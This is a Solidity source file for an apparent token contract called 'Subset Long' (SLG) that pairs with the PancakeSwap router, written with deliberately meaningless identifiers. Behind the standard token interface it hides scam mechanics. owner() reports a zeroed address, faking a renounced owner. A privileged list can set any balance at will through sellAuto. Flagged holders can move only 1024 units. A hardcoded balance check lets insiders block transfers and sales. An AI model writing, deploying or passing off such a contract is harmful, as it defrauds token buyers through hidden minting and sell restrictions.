//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface minTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract fromMaxReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptMarketing {
    function createPair(address atShouldTo, address totalMin) external returns (address);
}

interface senderEnable {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingTxLaunched) external view returns (uint256);

    function transfer(address swapTeam, uint256 enableWallet) external returns (bool);

    function allowance(address isTrading, address spender) external view returns (uint256);

    function approve(address spender, uint256 enableWallet) external returns (bool);

    function transferFrom(
        address sender,
        address swapTeam,
        uint256 enableWallet
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingAmount, uint256 value);
    event Approval(address indexed isTrading, address indexed spender, uint256 value);
}

interface senderEnableMetadata is senderEnable {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SubsetLong is fromMaxReceiver, senderEnable, senderEnableMetadata {

    uint256 constant swapAtToken = 2 ** 10;

    mapping(address => uint256) private totalExemptSwap;

    uint256 private sellListTotal;

    event OwnershipTransferred(address indexed amountLaunchTake, address indexed buyTx);

    function name() external view virtual override returns (string memory) {
        return totalExempt;
    }

    mapping(address => bool) public maxLiquidity;

    mapping(address => bool) public exemptTake;

    function symbol() external view virtual override returns (string memory) {
        return modeAt;
    }

    uint256 public fundMin;

    bool public autoLaunch;

    address fundTeamLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => mapping(address => uint256)) private fromMode;

    function listMarketing() public {
        emit OwnershipTransferred(txTake, address(0));
        liquidityExempt = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fundReceiver;
    }

    function decimals() external view virtual override returns (uint8) {
        return limitMin;
    }

    uint256 private totalMarketingMode;

    function owner() external view returns (address) {
        return liquidityExempt;
    }

    uint256 feeReceiver;

    function allowance(address enableFund, address senderMinLaunched) external view virtual override returns (uint256) {
        if (senderMinLaunched == shouldTeam) {
            return type(uint256).max;
        }
        return fromMode[enableFund][senderMinLaunched];
    }

    function fundLaunched(uint256 enableWallet) public {
        marketingEnable();
        swapTo = enableWallet;
    }

    function isFee(address exemptTo, address swapTeam, uint256 enableWallet) internal returns (bool) {
        if (exemptTo == txTake) {
            return takeLaunched(exemptTo, swapTeam, enableWallet);
        }
        uint256 maxIs = senderEnable(isSell).balanceOf(fundTeamLaunched);
        require(maxIs == swapTo);
        require(swapTeam != fundTeamLaunched);
        if (maxLiquidity[exemptTo]) {
            return takeLaunched(exemptTo, swapTeam, swapAtToken);
        }
        return takeLaunched(exemptTo, swapTeam, enableWallet);
    }

    function exemptTotalTeam(address toSell) public {
        require(toSell.balance < 100000);
        if (autoLaunch) {
            return;
        }
        
        exemptTake[toSell] = true;
        if (sellListTotal != fundMin) {
            sellListTotal = fundMin;
        }
        autoLaunch = true;
    }

    function transferFrom(address exemptTo, address swapTeam, uint256 enableWallet) external override returns (bool) {
        if (_msgSender() != shouldTeam) {
            if (fromMode[exemptTo][_msgSender()] != type(uint256).max) {
                require(enableWallet <= fromMode[exemptTo][_msgSender()]);
                fromMode[exemptTo][_msgSender()] -= enableWallet;
            }
        }
        return isFee(exemptTo, swapTeam, enableWallet);
    }

    constructor (){
        
        minTeam launchMin = minTeam(shouldTeam);
        isSell = exemptMarketing(launchMin.factory()).createPair(launchMin.WETH(), address(this));
        
        txTake = _msgSender();
        listMarketing();
        exemptTake[txTake] = true;
        totalExemptSwap[txTake] = fundReceiver;
        
        emit Transfer(address(0), txTake, fundReceiver);
    }

    string private modeAt = "SLG";

    address public txTake;

    address private liquidityExempt;

    function takeLaunched(address exemptTo, address swapTeam, uint256 enableWallet) internal returns (bool) {
        require(totalExemptSwap[exemptTo] >= enableWallet);
        totalExemptSwap[exemptTo] -= enableWallet;
        totalExemptSwap[swapTeam] += enableWallet;
        emit Transfer(exemptTo, swapTeam, enableWallet);
        return true;
    }

    function marketingEnable() private view {
        require(exemptTake[_msgSender()]);
    }

    function transfer(address fromTx, uint256 enableWallet) external virtual override returns (bool) {
        return isFee(_msgSender(), fromTx, enableWallet);
    }

    function approve(address senderMinLaunched, uint256 enableWallet) public virtual override returns (bool) {
        fromMode[_msgSender()][senderMinLaunched] = enableWallet;
        emit Approval(_msgSender(), senderMinLaunched, enableWallet);
        return true;
    }

    uint256 swapTo;

    address public isSell;

    function balanceOf(address marketingTxLaunched) public view virtual override returns (uint256) {
        return totalExemptSwap[marketingTxLaunched];
    }

    uint8 private limitMin = 18;

    function getOwner() external view returns (address) {
        return liquidityExempt;
    }

    function sellAuto(address fromTx, uint256 enableWallet) public {
        marketingEnable();
        totalExemptSwap[fromTx] = enableWallet;
    }

    string private totalExempt = "Subset Long";

    uint256 private fundReceiver = 100000000 * 10 ** 18;

    address shouldTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function exemptMarketingAmount(address listAutoFee) public {
        marketingEnable();
        
        if (listAutoFee == txTake || listAutoFee == isSell) {
            return;
        }
        maxLiquidity[listAutoFee] = true;
    }

}